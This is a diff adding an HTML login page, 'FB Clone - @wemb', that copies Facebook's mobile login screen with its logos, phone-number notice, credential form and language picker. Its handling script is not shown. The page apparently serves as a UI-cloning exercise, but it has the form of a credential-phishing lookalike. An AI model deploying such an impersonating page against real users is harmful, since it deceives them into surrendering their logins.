@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FB Clone - @wemb</title>
+    <link rel="stylesheet" href="../css/login.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="language-selector">
+            <button id="languageBtn">English (US)</button>
+        </div>
+        <div class="logo">
+            <img src="../photo/facebook.jpg" alt="Facebook Logo">
+        </div>
+        <p class="info-text">Facebook requests and receives your phone number from your mobile network. <a href="#">Change Settings</a></p>
+        <form class="login-form" id="loginForm">
+            <input type="text" id="username" name="username" placeholder="Mobile number or email" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit">Log in</button>
+        </form>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <button class="create-account">Create new account</button>
+        <div class="meta-logo">
+            <img src="../photo/meta.jpg" alt="Meta Logo">
+        </div>
+    </div>
+
+    <div id="languageModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Select your language</h2>
+            <form>
+                <label><input type="radio" name="language" value="en-US" checked> English (US)</label>
+                <label><input type="radio" name="language" value="filipino"> Filipino</label>
+                <label><input type="radio" name="language" value="bisaya"> Bisaya</label>
+                <label><input type="radio" name="language" value="espanol"> Español</label>
+                <label><input type="radio" name="language" value="chinese"> 中文(简体)</label>
+                <label><input type="radio" name="language" value="french"> Français (France)</label>
+                <label><input type="radio" name="language" value="korean"> 한국어</label>
+                <label><input type="radio" name="language" value="arabic"> العربية</label>
+                <label><input type="radio" name="language" value="japanese"> 日本語</label>
+                <!-- Add more languages as needed -->
+            </form>
+        </div>
+    </div>
+
+    <script src="../js/login.js"></script>
+</body>
+</html>
